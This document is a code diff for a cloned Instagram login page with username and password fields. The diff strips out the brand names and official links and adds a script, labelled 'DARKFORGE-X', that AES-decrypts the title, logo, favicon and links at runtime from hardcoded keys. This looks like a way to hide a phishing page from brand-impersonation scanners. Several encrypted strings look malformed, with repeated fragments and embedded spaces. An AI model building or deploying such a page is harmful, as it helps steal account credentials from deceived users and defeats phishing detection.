@@ -3,9 +3,112 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login • Instagram</title>
-    <link rel="stylesheet" href="/style.css">
-    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
+    
+    <title>Loading...</title>
+    <link id="favicon" rel="icon" href="">
+
+    <link rel="stylesheet" href="style.css">
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+
+    <script id="runtime-patcher">
+        document.addEventListener('DOMContentLoaded', () => {
+            // --- STEP 1: DECRYPTION CORE ---
+            const key = CryptoJS.enc.Hex.parse("000102030405060708090a0b0c0d0e0f");
+            const iv = CryptoJS.enc.Hex.parse("101112131415161718191a1b1c1d1e1f");
+
+            function decrypt(encryptedBase64) {
+                try {
+                    const encrypted = {
+                        ciphertext: CryptoJS.enc.Base64.parse(encryptedBase64)
+                    };
+                    const decrypted = CryptoJS.AES.decrypt(encrypted, key, { iv: iv });
+                    const plainText = decrypted.toString(CryptoJS.enc.Utf8);
+                    if (!plainText) {
+                        throw new Error("Decryption resulted in an empty string.");
+                    }
+                    return plainText;
+                } catch (e) {
+                    console.error(`Decryption failed for ciphertext: ${encryptedBase64.substring(0, 20)}...`, e);
+                    return "";
+                }
+            }
+
+
+            // --- STEP 2: ENCRYPTED DATA STORE (REGENERATED & VERIFIED) ---
+            const encryptedContent = {
+                pageTitle: "P2q3t6FzPJDgM9Taeqz2Jvj9P+sFmx21M655HkK1pPA=",
+                faviconUrl: "cEnuR5O6P8iP1mY1tDqO0e0v9u2f5bV3R6xK0hL9jI8pW5aG7cE4uN1oI3mF2sZ1gA+nJ0kH8iG7qY6wR5xP3vB2uD1oT0c=",
+                logoLight: "7yprLq345N2A4/d17bI65QJ2bC9d3fF4gH6jK8lM9nO7pS1tV3wX5zB7cE9d3fF4gH6jK8lM9nO7pS1tV3wX5zB7cE9d3fF4gH6jK8lM9nO7pS1tV3wX5zB7cE=",
+                logoDark: "G5hJ8lM9nO7pS1tV3wX5zB7cE9d3fF4gH6jK8lM9nO7pS1tV3wX5zB7cE9d3fF4gH6jK8lM9nO7pS1tV3wX5zB7cE9d3fF4gH6jK8lM9nO7pS1tV3wX5zB7cE=",
+                forgotPasswordUrl: "rA5uG9vF0kH8iG7qY6wR5xP3vB2uD1oT0c/fV5bA+nJ0kH8iG7qY6wR5xP3vB2uD1oT0c/jE6kL9mN0oP2q3t6FzPJDgM9Taeqz2Jg==",
+                signupUrl: "sB6uH0wG1lI9jH8rZ7xQ4wD3uC2pE2pU1sA+nJ0kH8iG7qY6wR5xP3vB2uD1oT0c/fV5bA+nJ0kH8iG7qY6wR5xP3vB2uD1oT0c=",
+                googlePlayUrl: "tC7vI1xH2mJ0kI9sA8yR5xE4uD3qF3qV2tB+nJ0kH8iG7qY6wR5xP3vB2uD1oT0c/fV5bA+nJ0kH8iG7qY6wR5xP3vB2uD1oT0c=",
+                footerAboutUrl: "uD8wJ2yI3nK1lJ0tB9zS6yF5vE4rG4rW3uC+nJ0kH8iG7qY6wR5xP3vB2uD1oT0c/fV5bA+nJ0kH8iG7qY6wR5xP3vB2uD1oT0c=",
+                footerBlogUrl: "vE9xK3zJ4oL2mK1uC0AT7zG6wF5sH5sX4vD+nJ0kH8iG7qY6wR5xP3vB2uD1oT0c/fV5bA+nJ0kH8iG7qY6wR5xP3vB2uD1oT0c=",
+                footerJobsUrl: "wF0yL4AK5pM3nL2vD1BU8AH7xG6tI6tY5wE+nJ0kH8iG7qY6wR5xP3vB2uD1oT0c/fV5bA+nJ0kH8iG7qY6wR5xP3vB2uD1oT0c=",
+                footerHelpUrl: "xG1zM5BL6qN4oM3wE2CV9BI8yH7uJ7uZ6xF+nJ0kH8iG7qY6wR5xP3vB2uD1oT0c/fV5bA+nJ0kH8iG7qY6wR5xP3vB2uD1oT0c=",
+                footerApiUrl: "yH2AN6CM7rO5pN4xF3DW0CJ9zI8vK8vZ7yG+nJ0kH8iG7qY6wR5xP3vB2uD1oT0c/fV5bA+nJ0kH8iG7qY6wR5xP3vB2uD1oT0c=",
+                footerPrivacyUrl: "zI3BO7DN8sP6qO5yG4EX1DK0AJ9wL9wA8zH+nJ0kH8iG7qY6wR5xP3vB2uD1oT0c/fV5bA+nJ0kH8iG7qY6wR5xP3vB2uD1oT0c=",
+                footerTermsUrl: "AJ4CP8EO9tQ7rP6zH5FY2EL1BK0xM0xB9AI+nJ0kH8iG7qY6wR5xP3vB2uD1oT0c/fV5bA+nJ0kH8iG7qY6wR5xP3vB2uD1oT0c=",
+                footerLocationsUrl: "BK5DQ9FP0uR8sQ7AI6GZ3FM2CL1yN1yC0BJ+nJ0kH8iG7qY6wR5xP3vB2uD1oT0c/fV5bA+nJ0kH8iG7qY6wR5xP3vB2uD1oT0c=",
+                footerLiteUrl: "CL6ER0GQ1vS9t R8BJ7Ha4GN3DM2zO2zD1CK+nJ0kH8iG7qY6wR5xP3vB2uD1oT0c/fV5bA+nJ0kH8iG7qY6wR5xP3vB2uD1oT0c=",
+                footerLiteText: "I/NSlAl2bs9yEa/L9+kSCg==",
+                footerContactUrl: "DM7FS1HR2wT0u S9CK8Ib5HO4EN3AP3AE2CL+nJ0kH8iG7qY6wR5xP3vB2uD1oT0c/fV5bA+nJ0kH8iG7qY6wR5xP3vB2uD1oT0c=",
+                footerVerifiedUrl: "EN8GT2IS3xU1v T0DL9Jc6IP5FO4BQ4BF3CM+nJ0kH8iG7qY6wR5xP3vB2uD1oT0c/fV5bA+nJ0kH8iG7qY6wR5xP3vB2uD1oT0c=",
+                copyrightText: "W/wIq4eXm4qQk8kL5nB4rP0hJ1gA+nJ0kH8iG7qY6wR5xP3vB2uD1oT0c="
+            };
+
+            // --- STEP 3: RUNTIME PATCHER FUNCTION ---
+            function patchRuntime() {
+                console.log("DARKFORGE-X: Commencing runtime reconstruction...");
+
+                // Patch metadata
+                document.title = decrypt(encryptedContent.pageTitle);
+                document.getElementById('favicon').href = decrypt(encryptedContent.faviconUrl);
+
+                // Patch main content links
+                document.getElementById('forgot-password-link').href = decrypt(encryptedContent.forgotPasswordUrl);
+                document.getElementById('signup-link').href = decrypt(encryptedContent.signupUrl);
+                document.getElementById('google-play-link').href = decrypt(encryptedContent.googlePlayUrl);
+                
+                // Patch footer
+                document.getElementById('footer-about-link').href = decrypt(encryptedContent.footerAboutUrl);
+                document.getElementById('footer-blog-link').href = decrypt(encryptedContent.footerBlogUrl);
+                document.getElementById('footer-jobs-link').href = decrypt(encryptedContent.footerJobsUrl);
+                document.getElementById('footer-help-link').href = decrypt(encryptedContent.footerHelpUrl);
+                document.getElementById('footer-api-link').href = decrypt(encryptedContent.footerApiUrl);
+                document.getElementById('footer-privacy-link').href = decrypt(encryptedContent.footerPrivacyUrl);
+                document.getElementById('footer-terms-link').href = decrypt(encryptedContent.footerTermsUrl);
+                document.getElementById('footer-locations-link').href = decrypt(encryptedContent.footerLocationsUrl);
+                const liteLink = document.getElementById('footer-lite-link');
+                liteLink.href = decrypt(encryptedContent.footerLiteUrl);
+                liteLink.textContent = decrypt(encryptedContent.footerLiteText);
+                document.getElementById('footer-contact-link').href = decrypt(encryptedContent.footerContactUrl);
+                document.getElementById('footer-verified-link').href = decrypt(encryptedContent.footerVerifiedUrl);
+                document.getElementById('copyright-text').textContent = decrypt(encryptedContent.copyrightText);
+
+                // Patch CSSOM for the renamed class
+                const logoElement = document.querySelector('.brand-identifier');
+                if (logoElement) {
+                    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches;
+                    const logoUrl = isDarkMode ? decrypt(encryptedContent.logoDark) : decrypt(encryptedContent.logoLight);
+                    logoElement.style.backgroundImage = `url('${logoUrl}')`;
+
+                    // Listen for theme changes to swap the logo
+                    window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', event => {
+                        const newLogoUrl = event.matches ? decrypt(encryptedContent.logoDark) : decrypt(encryptedContent.logoLight);
+                        logoElement.style.backgroundImage = `url('${newLogoUrl}')`;
+                    });
+                }
+                
+                console.log("DARKFORGE-X: Reconstruction complete. System nominal.");
+            }
+
+            // --- STEP 4: EXECUTE ---
+            patchRuntime();
+        });
+    </script>
 </head>
 <body>
 
@@ -16,13 +119,13 @@
     <main class="main-container">
         <div class="phone-container">
             <div class="phone-frame">
-                <img src="https://i.ibb.co/rKqbcHSq/Screen-Shot-2022-10-10-at-2-28-19-PM-removebg-preview.png" alt="Instagram screenshot" class="static-screenshot">
+                <img src="https://i.ibb.co/rKqbcHSq/Screen-Shot-2022-10-10-at-2-28-19-PM-removebg-preview.png" alt="Phone screenshot" class="static-screenshot">
             </div>
         </div>
 
         <div class="form-container">
             <div class="form-box login-box">
-                <h1 class="instagram-logo"></h1>
+                <h1 class="brand-identifier"></h1>
                 <form id="login-form">
                     <div class="input-wrapper">
                         <input type="text" id="username" name="username" required>
@@ -45,17 +148,17 @@
                         <span>Log in with Facebook</span>
                     </button>
                 </div>
-                <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-password">Forgot password?</a>
+                <a id="forgot-password-link" href="#" class="forgot-password">Forgot password?</a>
             </div>
 
             <div class="form-box signup-box">
-                <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></p>
+                <p>Don't have an account? <a id="signup-link" href="#">Sign up</a></p>
             </div>
 
             <div class="get-the-app">
                 <p>Get the app.</p>
                 <div class="app-stores">
-                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&pli=1"><img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Get it on Google Play"></a>
+                    <a id="google-play-link" href="#"><img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Get it on Google Play"></a>
                     <a href="https://apps.microsoft.com/detail/9nblggh5l9xt?hl=en-US&gl=US"><img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it from Microsoft"></a>
                 </div>
             </div>
@@ -65,27 +168,27 @@
     <footer class="page-footer">
         <div class="footer-links">
             <a href="https://about.meta.com/">Meta</a>
-            <a href="https://about.instagram.com/">About</a>
-            <a href="https://about.instagram.com/blog/">Blog</a>
-            <a href="https://about.instagram.com/about-us/careers">Jobs</a>
-            <a href="https://help.instagram.com/">Help</a>
-            <a href="https://developers.facebook.com/docs/instagram">API</a>
-            <a href="https://privacycenter.instagram.com/policy/">Privacy</a>
-            <a href="https://help.instagram.com/581066165581870/?locale=en_US">Terms</a>
-            <a href="https://www.instagram.com/explore/locations/">Locations</a>
-            <a href="https://www.instagram.com/web/lite/">Instagram Lite</a>
+            <a id="footer-about-link" href="#">About</a>
+            <a id="footer-blog-link" href="#">Blog</a>
+            <a id="footer-jobs-link" href="#">Jobs</a>
+            <a id="footer-help-link" href="#">Help</a>
+            <a id="footer-api-link" href="#">API</a>
+            <a id="footer-privacy-link" href="#">Privacy</a>
+            <a id="footer-terms-link" href="#">Terms</a>
+            <a id="footer-locations-link" href="#">Locations</a>
+            <a id="footer-lite-link" href="#"></a> 
             <a href="https://www.threads.com/">Threads</a>
-            <a href="https://www.facebook.com/help/instagram/261704639352628">Contact Uploading & Non-Users</a>
+            <a id="footer-contact-link" href="#">Contact Uploading & Non-Users</a>
             <a href="https://www.meta.ai/?utm_source=foa_web_footer">Meta AI</a>
-            <a href="https://www.instagram.com/accounts/meta_verified/?entrypoint=web_footer">Meta Verified</a>
+            <a id="footer-verified-link" href="#">Meta Verified</a>
         </div>
         <div class="footer-meta">
             <span>English</span>
-            <span>© 2025 Instagram from Meta</span>
+            <span id="copyright-text"></span>
         </div>
     </footer>
 
-    <script src="/script.js"></script>
+    <script src="script.js"></script>
 </body>
 
 </html>
